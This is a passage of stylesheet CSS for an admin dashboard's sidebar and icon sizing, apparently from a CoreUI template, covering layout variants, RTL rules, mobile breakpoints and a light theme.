                font-size: 2rem;
            }
            .icon:not(.icon-c-s):not(.icon-custom-size).icon-xl {
                width: 1.5rem;
                height: 1.5rem;
                font-size: 1.5rem;
            }
            .icon:not(.icon-c-s):not(.icon-custom-size).icon-lg {
                width: 1.25rem;
                height: 1.25rem;
                font-size: 1.25rem;
            }
            .icon:not(.icon-c-s):not(.icon-custom-size).icon-sm {
                width: 0.875rem;
                height: 0.875rem;
                font-size: 0.875rem;
            }
            .icon:not(.icon-c-s):not(.icon-custom-size).icon-3xl {
                width: 3rem;
                height: 3rem;
                font-size: 3rem;
            }
            .icon:not(.icon-c-s):not(.icon-custom-size).icon-4xl {
                width: 4rem;
                height: 4rem;
                font-size: 4rem;
            }
            .icon:not(.icon-c-s):not(.icon-custom-size).icon-5xl {
                width: 5rem;
                height: 5rem;
                font-size: 5rem;
            }
            .icon:not(.icon-c-s):not(.icon-custom-size).icon-6xl {
                width: 6rem;
                height: 6rem;
                font-size: 6rem;
            }
            .icon:not(.icon-c-s):not(.icon-custom-size).icon-7xl {
                width: 7rem;
                height: 7rem;
                font-size: 7rem;
            }
            .icon:not(.icon-c-s):not(.icon-custom-size).icon-8xl {
                width: 8rem;
                height: 8rem;
                font-size: 8rem;
            }
            .icon:not(.icon-c-s):not(.icon-custom-size).icon-9xl {
                width: 9rem;
                height: 9rem;
                font-size: 9rem;
            }
            .sidebar {
                --cui-sidebar-width: 16rem;
                --cui-sidebar-bg: #3c4b64;
                --cui-sidebar-padding-x: 0;
                --cui-sidebar-padding-y: 0;
                --cui-sidebar-color: rgba(255, 255, 255, 0.87);
                --cui-sidebar-border-width: 0;
                --cui-sidebar-border-color: transparent;
                --cui-sidebar-brand-color: rgba(255, 255, 255, 0.87);
                --cui-sidebar-brand-height: 4rem;
                --cui-sidebar-brand-bg: rgba(0, 0, 21, 0.2);
                --cui-sidebar-close-button-width: 2rem;
                --cui-sidebar-close-button-height: 4rem;
                --cui-sidebar-header-height: 4rem;
                --cui-sidebar-header-bg: rgba(0, 0, 21, 0.2);
                --cui-sidebar-header-padding-x: 1rem;
                --cui-sidebar-header-padding-y: 0.75rem;
                --cui-sidebar-footer-bg: rgba(0, 0, 21, 0.2);
                --cui-sidebar-footer-height: auto;
                --cui-sidebar-footer-padding-x: 1rem;
                --cui-sidebar-footer-padding-y: 0.75rem;
                --cui-sidebar-toggler-bg: rgba(0, 0, 21, 0.2);
                --cui-sidebar-toggler-height: 3rem;
                --cui-sidebar-toggler-indicator: url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 11 14'%3E%3Cpath fill='%238a93a2' d='M9.148 2.352l-4.148 4.148 4.148 4.148q0.148 0.148 0.148 0.352t-0.148 0.352l-1.297 1.297q-0.148 0.148-0.352 0.148t-0.352-0.148l-5.797-5.797q-0.148-0.148-0.148-0.352t0.148-0.352l5.797-5.797q0.148-0.148 0.352-0.148t0.352 0.148l1.297 1.297q0.148 0.148 0.148 0.352t-0.148 0.352z'/%3E%3C/svg%3E");
                --cui-sidebar-toggler-indicator-width: 4rem;
                --cui-sidebar-toggler-indicator-height: 3rem;
                --cui-sidebar-toggler-hover-bg: rgba(0, 0, 0, 0.3);
                --cui-sidebar-toggler-indicator-hover: url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 11 14'%3E%3Cpath fill='rgba%28255, 255, 255, 0.87%29' d='M9.148 2.352l-4.148 4.148 4.148 4.148q0.148 0.148 0.148 0.352t-0.148 0.352l-1.297 1.297q-0.148 0.148-0.352 0.148t-0.352-0.148l-5.797-5.797q-0.148-0.148-0.148-0.352t0.148-0.352l5.797-5.797q0.148-0.148 0.352-0.148t0.352 0.148l1.297 1.297q0.148 0.148 0.148 0.352t-0.148 0.352z'/%3E%3C/svg%3E");
                --cui-sidebar-narrow-width: 4rem;
                --cui-sidebar-nav-title-padding-x: 1rem;
                --cui-sidebar-nav-title-padding-y: 0.75rem;
                --cui-sidebar-nav-title-margin-top: 1rem;
                --cui-sidebar-nav-title-color: rgba(255, 255, 255, 0.6);
                --cui-sidebar-nav-link-padding-x: 1rem;
                --cui-sidebar-nav-link-padding-y: 0.8445rem;
                --cui-sidebar-nav-link-color: rgba(255, 255, 255, 0.6);
                --cui-sidebar-nav-link-bg: transparent;
                --cui-sidebar-nav-link-border-color: transparent;
                --cui-sidebar-nav-link-border: 0 solid var(--cui-sidebar-nav-link-border-color);
                --cui-sidebar-nav-link-border-radius: 0;
                --cui-sidebar-nav-link-active-color: rgba(255, 255, 255, 0.87);
                --cui-sidebar-nav-link-active-bg: rgba(255, 255, 255, 0.05);
                --cui-sidebar-nav-link-active-icon-color: rgba(255, 255, 255, 0.87);
                --cui-sidebar-nav-link-disabled-color: rgba(255, 255, 255, 0.38);
                --cui-sidebar-nav-link-disabled-icon-color: rgba(255, 255, 255, 0.6);
                --cui-sidebar-nav-link-hover-color: rgba(255, 255, 255, 0.87);
                --cui-sidebar-nav-link-hover-bg: rgba(255, 255, 255, 0.05);
                --cui-sidebar-nav-link-hover-icon-color: rgba(255, 255, 255, 0.87);
                --cui-sidebar-nav-icon-width: 4rem;
                --cui-sidebar-nav-icon-height: 1.25rem;
                --cui-sidebar-nav-icon-font-size: 1.25rem;
                --cui-sidebar-nav-link-icon-color: rgba(255, 255, 255, 0.6);
                --cui-sidebar-nav-group-bg: rgba(0, 0, 0, 0.2);
                --cui-sidebar-nav-group-items-padding-y: 0;
                --cui-sidebar-nav-group-items-padding-x: 0;
                --cui-sidebar-nav-group-indicator: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' fill='rgba%28255, 255, 255, 0.6%29'%3e%3cpath fill-rule='evenodd' d='M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z'/%3e%3c/svg%3e");
                --cui-sidebar-nav-group-indicator-hover: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' fill='rgba%28255, 255, 255, 0.87%29'%3e%3cpath fill-rule='evenodd' d='M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z'/%3e%3c/svg%3e");
                --cui-sidebar-nav-group-toggle-show-color: rgba(255, 255, 255, 0.6);
                position: relative;
                display: flex;
                flex: 0 0 var(--cui-sidebar-width);
                flex-direction: column;
                order: -1;
                width: var(--cui-sidebar-width);
                padding: var(--cui-sidebar-padding-y) var(--cui-sidebar-padding-x);
                color: var(--cui-sidebar-color);
                background: var(--cui-sidebar-bg);
                box-shadow: none;
                transition: margin-left 0.15s, margin-right 0.15s, box-shadow 0.075s, transform 0.15s, width 0.15s, z-index 0s ease 0.15s;
            }
            html:not([dir="rtl"]) .sidebar {
                border-right: var(--cui-sidebar-border-width) solid var(--cui-sidebar-border-color);
            }
            *[dir="rtl"] .sidebar {
                border-left: var(--cui-sidebar-border-width) solid var(--cui-sidebar-border-color);
            }
            @media (prefers-reduced-motion: reduce) {
                .sidebar {
                    transition: none;
                }
            }
            html:not([dir="rtl"]) .sidebar:not(.sidebar-end) {
                margin-left: 0;
            }
            *[dir="rtl"] .sidebar:not(.sidebar-end) {
                margin-right: 0;
            }
            .sidebar:not(.sidebar-end) ~ * {
                --cui-sidebar-occupy-start: 16rem;
            }
            .sidebar.sidebar-end {
                order: 99;
            }
            html:not([dir="rtl"]) .sidebar.sidebar-end {
                margin-right: 0;
            }
            *[dir="rtl"] .sidebar.sidebar-end {
                margin-left: 0;
            }
            .sidebar.sidebar-end ~ * {
                --cui-sidebar-occupy-end: 16rem;
            }
            .sidebar[class*="bg-"] {
                border-color: rgba(0, 0, 21, 0.1);
            }
            .sidebar.sidebar-sm {
                --cui-sidebar-width: 12rem;
            }
            @media (min-width: 768px) {
                .sidebar.sidebar-sm:not(.sidebar-end):not(.hide) ~ * {
                    --cui-sidebar-occupy-start: 12rem;
                }
                .sidebar.sidebar-sm.sidebar-end:not(.hide) ~ * {
                    --cui-sidebar-occupy-end: 12rem;
                }
            }
            .sidebar.sidebar-lg {
                --cui-sidebar-width: 20rem;
            }
            @media (min-width: 768px) {
                .sidebar.sidebar-lg:not(.sidebar-end):not(.hide) ~ * {
                    --cui-sidebar-occupy-start: 20rem;
                }
                .sidebar.sidebar-lg.sidebar-end:not(.hide) ~ * {
                    --cui-sidebar-occupy-end: 20rem;
                }
            }
            .sidebar.sidebar-xl {
                --cui-sidebar-width: 24rem;
            }
            @media (min-width: 768px) {
                .sidebar.sidebar-xl:not(.sidebar-end):not(.hide) ~ * {
                    --cui-sidebar-occupy-start: 24rem;
                }
                .sidebar.sidebar-xl.sidebar-end:not(.hide) ~ * {
                    --cui-sidebar-occupy-end: 24rem;
                }
            }
            @media (min-width: 768px) {
                html:not([dir="rtl"]) .sidebar.hide:not(.sidebar-end) {
                    margin-left: calc(-1 * var(--cui-sidebar-width));
                }
                *[dir="rtl"] .sidebar.hide:not(.sidebar-end) {
                    margin-right: calc(-1 * var(--cui-sidebar-width));
                }
                .sidebar.hide:not(.sidebar-end) ~ * {
                    --cui-sidebar-occupy-start: 0;
                }
                html:not([dir="rtl"]) .sidebar.hide.sidebar-end {
                    margin-right: calc(-1 * var(--cui-sidebar-width));
                }
                *[dir="rtl"] .sidebar.hide.sidebar-end {
                    margin-left: calc(-1 * var(--cui-sidebar-width));
                }
                .sidebar.hide.sidebar-end ~ * {
                    --cui-sidebar-occupy-end: 0;
                }
            }
            @media (min-width: 768px) {
                .sidebar.sidebar-fixed {
                    position: fixed;
                    top: 0;
                    bottom: 0;
                    z-index: 1030;
                    box-shadow: 0 2px 2px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.14), 0 3px 1px -2px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.12),
                        0 1px 5px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.2);
                }
                .sidebar.sidebar-fixed:not([class*="border"]) {
                    border: 0;
                }
                html:not([dir="rtl"]) .sidebar.sidebar-fixed:not(.sidebar-end) {
                    left: 0;
                }
                *[dir="rtl"] .sidebar.sidebar-fixed:not(.sidebar-end) {
                    right: 0;
                }
                html:not([dir="rtl"]) .sidebar.sidebar-fixed.sidebar-end {
                    right: 0;
                }
                *[dir="rtl"] .sidebar.sidebar-fixed.sidebar-end {
                    left: 0;
                }
            }
            @media (min-width: 768px) {
                .sidebar.sidebar-sticky {
                    position: -webkit-sticky;
                    position: sticky;
                    top: 0;
                    height: 100vh;
                }
            }
            .sidebar.sidebar-overlaid {
                position: fixed;
                top: 0;
                bottom: 0;
                z-index: 1032;
            }
            .sidebar.sidebar-overlaid:not(.hide) {
                box-shadow: 0 3px 4px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.14), 0 3px 3px -2px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.12), 0 1px 8px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.2);
            }
            .sidebar.sidebar-overlaid:not(.hide):not([class*="border"]) {
                border: 0;
            }
            html:not([dir="rtl"]) .sidebar.sidebar-overlaid:not(.sidebar-end) {
                left: 0;
            }
            *[dir="rtl"] .sidebar.sidebar-overlaid:not(.sidebar-end) {
                right: 0;
            }
            .sidebar.sidebar-overlaid:not(.sidebar-end) ~ * {
                --cui-sidebar-occupy-start: 0 !important;
            }
            html:not([dir="rtl"]) .sidebar.sidebar-overlaid.sidebar-end {
                right: 0;
            }
            *[dir="rtl"] .sidebar.sidebar-overlaid.sidebar-end {
                left: 0;
            }
            .sidebar.sidebar-overlaid.sidebar-end ~ * {
                --cui-sidebar-occupy-end: 0 !important;
            }
            @media (max-width: 767.98px) {
                .sidebar {
                    --cui-is-mobile: true;
                    position: fixed;
                    top: 0;
                    bottom: 0;
                    z-index: 1031;
                }
                html:not([dir="rtl"]) .sidebar:not(.sidebar-end) {
                    left: 0;
                }
                *[dir="rtl"] .sidebar:not(.sidebar-end) {
                    right: 0;
                }
                .sidebar:not(.sidebar-end) ~ * {
                    --cui-sidebar-occupy-start: 0 !important;
                }
                html:not([dir="rtl"]) .sidebar:not(.sidebar-end):not(.show) {
                    margin-left: calc(-1 * var(--cui-sidebar-width));
                }
                *[dir="rtl"] .sidebar:not(.sidebar-end):not(.show) {
                    margin-right: calc(-1 * var(--cui-sidebar-width));
                }
                html:not([dir="rtl"]) .sidebar.sidebar-end {
                    right: 0;
                }
                *[dir="rtl"] .sidebar.sidebar-end {
                    left: 0;
                }
                .sidebar.sidebar-end ~ * {
                    --cui-sidebar-occupy-end: 0 !important;
                }
                html:not([dir="rtl"]) .sidebar.sidebar-end:not(.show) {
                    margin-right: calc(-1 * var(--cui-sidebar-width));
                }
                *[dir="rtl"] .sidebar.sidebar-end:not(.show) {
                    margin-left: calc(-1 * var(--cui-sidebar-width));
                }
            }
            .sidebar-close {
                position: absolute;
                top: 0;
                width: var(--cui-sidebar-close-button-width);
                height: var(--cui-sidebar-close-button-height);
                color: var(--cui-sidebar-color);
                background: 0 0;
                border: 0;
            }
            html:not([dir="rtl"]) .sidebar-close {
                right: 0;
            }
            *[dir="rtl"] .sidebar-close {
                left: 0;
            }
            .sidebar-close:hover {
                text-decoration: none;
            }
            .sidebar-close:focus {
                outline: 0;
            }
            .sidebar-brand {
                display: flex;
                flex: 0 0 var(--cui-sidebar-brand-height);
                align-items: center;
                justify-content: center;
                color: var(--cui-sidebar-brand-color);
                background: var(--cui-sidebar-brand-bg);
            }
            .sidebar-brand .sidebar-brand-narrow {
                display: none;
            }
            .sidebar-header {
                flex: 0 0 var(--cui-sidebar-header-height);
                padding: var(--cui-sidebar-header-padding-y) var(--cui-sidebar-header-padding-x);
                text-align: center;
                background: var(--cui-sidebar-header-bg);
                transition: height 0.15s, padding 0.15s;
            }
            @media (prefers-reduced-motion: reduce) {
                .sidebar-header {
                    transition: none;
                }
            }
            .sidebar-header .nav-link {
                display: flex;
                align-items: center;
                min-height: var(--cui-sidebar-header-height);
            }
            .sidebar-footer {
                flex: 0 0 var(--cui-sidebar-footer-height);
                padding: var(--cui-sidebar-footer-padding-y) var(--cui-sidebar-footer-padding-x);
                background: var(--cui-sidebar-footer-bg);
                transition: height 0.15s, padding 0.15s;
            }
            @media (prefers-reduced-motion: reduce) {
                .sidebar-footer {
                    transition: none;
                }
            }
            .sidebar-toggler {
                display: flex;
                flex: 0 0 var(--cui-sidebar-toggler-height);
                justify-content: flex-end;
                width: inherit;
                padding: 0;
                cursor: pointer;
                background-color: var(--cui-sidebar-toggler-bg);
                border: 0;
            }
            @media (max-width: 767.98px) {
                .sidebar-toggler {
                    display: none;
                }
            }
            .sidebar-toggler::before {
                display: block;
                width: var(--cui-sidebar-toggler-indicator-width);
                height: var(--cui-sidebar-toggler-indicator-height);
                content: "";
                background-image: var(--cui-sidebar-toggler-indicator);
                background-repeat: no-repeat;
                background-position: center;
                background-size: calc(var(--cui-sidebar-toggler-indicator-height) * 0.25);
                transition: transform 0.15s;
            }
            @media (prefers-reduced-motion: reduce) {
                .sidebar-toggler::before {
                    transition: none;
                }
            }
            *[dir="rtl"] .sidebar-toggler::before {
                transform: rotate(-180deg);
            }
            .sidebar-toggler:focus {
                outline: 0;
            }
            .sidebar-toggler:hover {
                background-color: var(--cui-sidebar-toggler-hover-bg);
            }
            .sidebar-toggler:hover::before {
                background-image: var(--cui-sidebar-toggler-indicator-hover);
            }
            .sidebar-end .sidebar-toggler {
                justify-content: flex-start;
            }
            .sidebar-end .sidebar-toggler::before {
                transform: rotate(-180deg);
            }
            .sidebar-backdrop {
                --cui-backdrop-zindex: 1030;
                --cui-backdrop-bg: #000015;
                --cui-backdrop-opacity: 0.5;
            }
            @media (max-width: 767.98px) {
                .sidebar-backdrop {
                    position: fixed;
                    top: 0;
                    left: 0;
                    z-index: var(--cui-backdrop-zindex);
                    width: 100vw;
                    height: 100vh;
                    background-color: var(--cui-backdrop-bg);
                }
                .sidebar-backdrop.fade {
                    opacity: 0;
                }
                .sidebar-backdrop.show {
                    opacity: var(--cui-backdrop-opacity);
                }
            }
            .sidebar-light {
                --cui-sidebar-color: rgba(44, 56, 74, 0.95);
                --cui-sidebar-bg: #fff;
                --cui-sidebar-border-width: 0;
                --cui-sidebar-border-color: transparent;
                --cui-sidebar-brand-color: #fff;
                --cui-sidebar-brand-bg: #321fdb;
                --cui-sidebar-header-bg: rgba(0, 0, 21, 0.2);
                --cui-sidebar-nav-title-color: rgba(44, 56, 74, 0.681);
                --cui-sidebar-nav-link-color: rgba(44, 56, 74, 0.681);
                --cui-sidebar-nav-link-bg: transparent;
                --cui-sidebar-nav-link-icon-color: rgba(44, 56, 74, 0.681);
                --cui-sidebar-nav-link-hover-color: rgba(44, 56, 74, 0.95);
                --cui-sidebar-nav-link-hover-bg: theme-color("primary");
                --cui-sidebar-nav-link-hover-icon-color: rgba(44, 56, 74, 0.95);
                --cui-sidebar-nav-link-active-color: rgba(44, 56, 74, 0.95);
                --cui-sidebar-nav-link-active-bg: rgba(255, 255, 255, 0.05);
                --cui-sidebar-nav-link-active-icon-color: rgba(44, 56, 74, 0.95);
                --cui-sidebar-nav-link-disabled-color: rgba(44, 56, 74, 0.38);
                --cui-sidebar-nav-link-disabled-icon-color: rgba(44, 56, 74, 0.681);
                --cui-sidebar-nav-group-bg: rgba(0, 0, 0, 0.05);
                --cui-sidebar-nav-group-toggle-show-color: rgba(44, 56, 74, 0.681);
                --cui-sidebar-nav-group-indicator: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' fill='rgba(44, 56, 74, 0.681)'><path fill-rule='evenodd' d='M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z'/></svg>");
                --cui-sidebar-nav-group-indicator-hover: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' fill='rgba(44, 56, 74, 0.95)'><path fill-rule='evenodd' d='M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z'/></svg>");
                --cui-sidebar-footer-bg: rgba(0, 0, 21, 0.1);
                --cui-sidebar-toggler-bg: rgba(0, 0, 21, 0.1);
                --cui-sidebar-toggler-hover-bg: rgba(0, 0, 0, 0.2);
                --cui-sidebar-toggler-indicator: url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 11 14'%3E%3Cpath fill='rgba(44, 56, 74, 0.681)' d='M9.148 2.352l-4.148 4.148 4.148 4.148q0.148 0.148 0.148 0.352t-0.148 0.352l-1.297 1.297q-0.148 0.148-0.352 0.148t-0.352-0.148l-5.797-5.797q-0.148-0.148-0.148-0.352t0.148-0.352l5.797-5.797q0.148-0.148 0.352-0.148t0.352 0.148l1.297 1.297q0.148 0.148 0.148 0.352t-0.148 0.352z'/%3E%3C/svg%3E");
                --cui-sidebar-toggler-indicator-hover: url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 11 14'%3E%3Cpath fill='rgba(44, 56, 74, 0.95)' d='M9.148 2.352l-4.148 4.148 4.148 4.148q0.148 0.148 0.148 0.352t-0.148 0.352l-1.297 1.297q-0.148 0.148-0.352 0.148t-0.352-0.148l-5.797-5.797q-0.148-0.148-0.148-0.352t0.148-0.352l5.797-5.797q0.148-0.148 0.352-0.148t0.352 0.148l1.297 1.297q0.148 0.148 0.148 0.352t-0.148 0.352z'/%3E%3C/svg%3E");
            }
            .sidebar-nav {
                position: relative;
                display: flex;
                flex: 1;
                flex-direction: column;
                padding: 0;
                margin-bottom: 0;
                overflow-x: hidden;
                overflow-y: auto;
                list-style: none;
            }
            .sidebar-nav .nav-title {
                padding: var(--cui-sidebar-nav-title-padding-y) var(--cui-sidebar-nav-title-padding-x);
                margin-top: var(--cui-sidebar-nav-title-margin-top);
                font-size: 80%;
                font-weight: 700;
                color: var(--cui-sidebar-nav-title-color);
                text-transform: uppercase;
                transition: height 0.15s, margin 0.15s;
            }
            @media (prefers-reduced-motion: reduce) {
                .sidebar-nav .nav-title {
                    transition: none;
                }
            }
            .sidebar-nav .nav-link {
                display: flex;
                flex: 1;
                align-items: center;
                padding: var(--cui-sidebar-nav-link-padding-y) var(--cui-sidebar-nav-link-padding-x);
                color: var(--cui-sidebar-nav-link-color);
                text-decoration: none;
                white-space: nowrap;
                background: var(--cui-sidebar-nav-link-bg);
                border: var(--cui-sidebar-nav-link-border);
                border-radius: var(--cui-sidebar-nav-link-border-radius);
                transition: background 0.15s ease, color 0.15s ease;
            }
            @media (prefers-reduced-motion: reduce) {
                .sidebar-nav .nav-link {
                    transition: none;
                }
            }
            .sidebar-nav .nav-link.active {
                color: var(--cui-sidebar-nav-link-active-color);
                background: var(--cui-sidebar-nav-link-active-bg);
            }
            .sidebar-nav .nav-link.active .nav-icon {
                color: var(--cui-sidebar-nav-link-active-icon-color);
            }
            .sidebar-nav .nav-link.disabled {
                color: var(--cui-sidebar-nav-link-disabled-color);
                pointer-events: none;
                cursor: not-allowed;
                background: 0 0;
            }
            .sidebar-nav .nav-link.disabled .nav-icon {
                color: var(--cui-sidebar-nav-link-disabled-icon-color);
            }
            .sidebar-nav .nav-link.disabled:hover {
                color: var(--cui-sidebar-nav-link-disabled-color);
            }
            .sidebar-nav .nav-link.disabled:hover .nav-icon {
                color: var(--cui-sidebar-nav-link-disabled-icon-color);
            }
            .sidebar-nav .nav-link.disabled:hover.nav-dropdown-toggle::after {
                background-image: var(--cui-sidebar-nav-group-indicator-hover);
            }
            @media (hover: hover), (-ms-high-contrast: none) {
                .sidebar-nav .nav-link:hover {
                    color: var(--cui-sidebar-nav-link-hover-color);
                    text-decoration: none;
                    background: var(--cui-sidebar-nav-link-hover-bg);
                }
                .sidebar-nav .nav-link:hover .nav-icon {
                    color: var(--cui-sidebar-nav-link-hover-icon-color);
                }
                .sidebar-nav .nav-link:hover.nav-group-toggle::after {
                    background-image: var(--cui-sidebar-nav-group-indicator-hover);
                }
            }
            .sidebar-nav .nav-icon {
                flex: 0 0 var(--cui-sidebar-nav-icon-width);
                height: var(--cui-sidebar-nav-icon-height);
                font-size: var(--cui-sidebar-nav-icon-font-size);
                color: var(--cui-sidebar-nav-link-icon-color);
                text-align: center;
                pointer-events: none;
                fill: currentcolor;
                transition: inherit;
            }
            @media (prefers-reduced-motion: reduce) {
                .sidebar-nav .nav-icon {
                    transition: none;
                }
            }
            html:not([dir="rtl"]) .sidebar-nav .nav-icon:first-child {
                margin-left: calc(var(--cui-sidebar-nav-link-padding-x) * -1);
            }
            *[dir="rtl"] .sidebar-nav .nav-icon:first-child {
                margin-right: calc(var(--cui-sidebar-nav-link-padding-x) * -1);
            }
            .sidebar-nav svg.nav-icon {
                overflow: hidden;
            }
            .sidebar-nav .nav-group {
                position: relative;
                transition: background 0.15s ease-in-out;
            }
            @media (prefers-reduced-motion: reduce) {
                .sidebar-nav .nav-group {
                    transition: none;
                }
            }
            .sidebar-nav .nav-group .nav-group-items {
                padding: var(--cui-sidebar-nav-group-items-padding-y) var(--cui-sidebar-nav-group-items-padding-x);
                overflow: hidden;
                transition: height 0.15s ease;
            }
            @media (prefers-reduced-motion: reduce) {
                .sidebar-nav .nav-group .nav-group-items {
                    transition: none;
                }
            }
            .sidebar-nav .nav-group:not(.show) .nav-group-items {
                display: none;
            }
            .sidebar-nav .nav-group.show {
                background: var(--cui-sidebar-nav-group-bg);
            }
            .sidebar-nav .nav-group.show .nav-group-toggle {
                color: var(--cui-sidebar-nav-group-toggle-show-color);
            }
            .sidebar-nav .nav-group.show > .nav-group-toggle::after {
                transform: rotate(180deg);
            }
            .sidebar-nav .nav-group.show + .show {
                margin-top: 1px;
            }
            .sidebar-nav .nav-group-toggle {
                cursor: pointer;
            }
            .sidebar-nav .nav-group-toggle::after {
                display: block;
                flex: 0 12px;
                height: 12px;
                content: "";
                background-image: var(--cui-sidebar-nav-group-indicator);
                background-repeat: no-repeat;
                background-position: center;
                transition: transform 0.15s;
            }
            html:not([dir="rtl"]) .sidebar-nav .nav-group-toggle::after {
                margin-left: auto;
            }
            *[dir="rtl"] .sidebar-nav .nav-group-toggle::after {
                margin-right: auto;
            }
            @media (prefers-reduced-motion: reduce) {
                .sidebar-nav .nav-group-toggle::after {
                    transition: none;
                }
            }
            .sidebar-nav .nav-group-items {
                padding: 0;
                list-style: none;
            }
            html:not([dir="rtl"]) .sidebar-nav .nav-group-items .nav-link {
                padding-left: var(--cui-sidebar-nav-icon-width);
            }
            *[dir="rtl"] .sidebar-nav .nav-group-items .nav-link {
                padding-right: var(--cui-sidebar-nav-icon-width);
            }
            html:not([dir="rtl"]) .sidebar-nav .nav-group-items .nav-link .nav-icon {
                margin-left: calc(var(--cui-sidebar-nav-icon-width) * -1);
            }
            *[dir="rtl"] .sidebar-nav .nav-group-items .nav-link .nav-icon {
                margin-right: calc(var(--cui-sidebar-nav-icon-width) * -1);
            }
            .sidebar-nav.compact .nav-link,
            .sidebar-nav .compact .nav-link {
                padding-top: calc(var(--cui-sidebar-nav-link-padding-y) * 0.5);
                padding-bottom: calc(var(--cui-sidebar-nav-link-padding-y) * 0.5);
            }
            @media (min-width: 768px) {
                .sidebar-narrow-unfoldable:not(:hover),
                .sidebar-narrow {
                    z-index: 1031;
                    flex: 0 0 var(--cui-sidebar-narrow-width);
                    width: var(--cui-sidebar-narrow-width);
                    padding-bottom: var(--cui-sidebar-toggler-height);
                    overflow: visible;
                }
                .sidebar-fixed.sidebar-narrow-unfoldable:not(:hover),
                .sidebar-fixed.sidebar-narrow {
                    z-index: 1031;
                    width: var(--cui-sidebar-narrow-width);
                }
                .sidebar-narrow-unfoldable:not(:hover) .sidebar-brand-full,
                .sidebar-narrow .sidebar-brand-full {
                    display: none;
                }
                .sidebar-narrow-unfoldable:not(:hover) .sidebar-brand-narrow,
                .sidebar-narrow .sidebar-brand-narrow {
                    display: block;
                }
                .sidebar-narrow-unfoldable:not(:hover) .d-narrow-none,
                .sidebar-narrow .d-narrow-none,
                .sidebar-narrow-unfoldable:not(:hover) .nav-label,
                .sidebar-narrow .nav-label,
                .sidebar-narrow-unfoldable:not(:hover) .nav-title,
                .sidebar-narrow .nav-title,
                .sidebar-narrow-unfoldable:not(:hover) .nav-group-items,
                .sidebar-narrow .nav-group-items,
                .sidebar-narrow-unfoldable:not(:hover) .sidebar-footer,
                .sidebar-narrow .sidebar-footer,
                .sidebar-narrow-unfoldable:not(:hover) .sidebar-form,
                .sidebar-narrow .sidebar-form,
                .sidebar-narrow-unfoldable:not(:hover) .sidebar-header,
                .sidebar-narrow .sidebar-header {
                    height: 0 !important;
                    padding: 0;
                    margin: 0;
                    visibility: hidden;
                    opacity: 0;
                }
                .sidebar-narrow-unfoldable:not(:hover) .sidebar-toggler,
                .sidebar-narrow .sidebar-toggler {
                    position: fixed;
                    bottom: 0;
                }
                html:not([dir="rtl"]) .sidebar-narrow-unfoldable:not(:hover) .sidebar-toggler::before,
                html:not([dir="rtl"]) .sidebar-narrow .sidebar-toggler::before {
                    transform: rotate(-180deg);
                }
                *[dir="rtl"] .sidebar-narrow-unfoldable:not(:hover) .sidebar-toggler::before,
                *[dir="rtl"] .sidebar-narrow .sidebar-toggler::before {
                    transform: rotate(0deg);
                }
                .sidebar-end.sidebar-narrow-unfoldable:not(:hover) .sidebar-toggler::before,
                .sidebar-end.sidebar-narrow .sidebar-toggler::before {
                    transform: rotate(0deg);
                }
            }
            .sidebar-narrow:not(.sidebar-end) ~ * {
                --cui-sidebar-occupy-start: 4rem;
            }
            .sidebar-narrow.sidebar-end ~ * {
                --cui-sidebar-occupy-end: 4rem;
            }
            .sidebar-narrow-unfoldable {
                position: fixed;
                z-index: 1031;
            }
            .sidebar-narrow-unfoldable:not(.sidebar-end) ~ * {
                --cui-sidebar-occupy-start: 4rem;
            }
            .sidebar-narrow-unfoldable.sidebar-end ~ * {
                --cui-sidebar-occupy-end: 4rem;
            }
            html:not([dir="rtl"]) .sidebar-narrow-unfoldable:hover .sidebar-toggler::before {
                transform: rotate(-180deg);
            }
            *[dir="rtl"] .sidebar-narrow-unfoldable:hover .sidebar-toggler::before {
                transform: rotate(0deg);
            }
            .sidebar-narrow-unfoldable:hover.sidebar-end .sidebar-toggler::before {
                transform: rotate(0deg);
            }
            html:not([dir="rtl"]) .sidebar:not(.show).sidebar-self-hiding.sidebar-narrow:not(.sidebar-end),
            html:not([dir="rtl"]) .sidebar:not(.show).sidebar-self-hiding.sidebar-narrow-unfoldable:not(.sidebar-end) {
                margin-left: calc(var(--cui-sidebar-narrow-width) * -1);
            }
            *[dir="rtl"] .sidebar:not(.show).sidebar-self-hiding.sidebar-narrow:not(.sidebar-end),
            *[dir="rtl"] .sidebar:not(.show).sidebar-self-hiding.sidebar-narrow-unfoldable:not(.sidebar-end) {
                margin-right: calc(var(--cui-sidebar-narrow-width) * -1);
            }
            html:not([dir="rtl"]) .sidebar:not(.show).sidebar-self-hiding.sidebar-narrow.sidebar-end,
            html:not([dir="rtl"]) .sidebar:not(.show).sidebar-self-hiding.sidebar-narrow-unfoldable.sidebar-end {
                margin-right: calc(var(--cui-sidebar-narrow-width) * -1);
            }
            *[dir="rtl"] .sidebar:not(.show).sidebar-self-hiding.sidebar-narrow.sidebar-end,
